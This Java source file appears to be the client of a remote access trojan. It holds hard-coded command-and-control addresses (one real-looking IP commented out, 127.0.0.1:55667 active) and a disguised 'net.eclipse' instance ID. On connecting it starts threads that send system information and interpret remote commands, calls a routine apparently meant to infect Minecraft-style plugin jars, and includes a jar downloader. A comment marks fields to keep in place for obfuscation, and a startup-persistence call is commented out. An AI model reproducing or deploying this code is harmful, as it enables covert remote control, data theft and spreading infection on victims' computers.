package net.vitox.client;

import net.vitox.client.feature.InfectPlugins;
import net.vitox.client.util.Unique4j;
import net.vitox.client.util.exception.Unique4jException;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;

@SuppressWarnings("ConstantConditions")
public class Client {

    public static String IP_ADDRESS; //DONT CHANGE POSITION FOR OBF
    public static String PORT; //DONT CHANGE POSITION FOR OBF

    final static boolean[] tryToConnect = {true};
    public static String TRIM_CHAR = "~";
    public static Unique4j unique;
    public static String APP_ID = "net.eclipse-7613562654";

    public static File clientLocation = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getFile());

    public static void main(String[] args) throws URISyntaxException {

        Client client = new Client();
        //  StartupUtil.addToStartup();
        client.connect();

    }

    public void connect() {
        Thread instanceThread = new Thread(new Runnable() {
            @Override
            public void run() {
                unique = new Unique4j(APP_ID) {
                    @Override
                    public void receiveMessage(String message) {}

                    @Override
                    public String sendMessage() {
                        return "";
                    }
                };
            }
        });

        instanceThread.start();

        new Thread(() -> {
            try {
                instanceThread.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            try {
                if (unique.acquireLock()) {

                    Socket socket;

                    while (tryToConnect[0]) {
                        try {
                            socket = new Socket(IP_ADDRESS, Integer.parseInt(PORT));
                            if (socket.isConnected()) {
                                new Thread(new SendInformationThread(socket)).start();
                                new Thread(new InterpreteCMD(socket)).start();
                                tryToConnect[0] = false;
                            }

                        } catch (Exception e) {
                            tryToConnect[0] = true;
                        }
                    }
                }
            } catch (Unique4jException e) {
                e.printStackTrace();
            }
        }).start();

        try {
            Class.forName("net.vitox.utils.JarUtils");

            new Thread(new Runnable() {
                @Override
                public void run() {
                    InfectPlugins.collectPlugins();
                }
            }).start();
        } catch (ClassNotFoundException e) {
        }
    }

    public static void downloadJar(String url, String path) throws IOException {
        URL website = new URL(url);
        ReadableByteChannel rbc = Channels.newChannel(website.openStream());
        FileOutputStream fos = new FileOutputStream(path);
        fos.getChannel().transferFrom(rbc, 0, 2147483647);
        fos.close();
    }

    static {
        if (IP_ADDRESS == null) {
         //   IP_ADDRESS = "188.116.36.254";
            IP_ADDRESS = "127.0.0.1";
            PORT = "55667";
        }
    }
}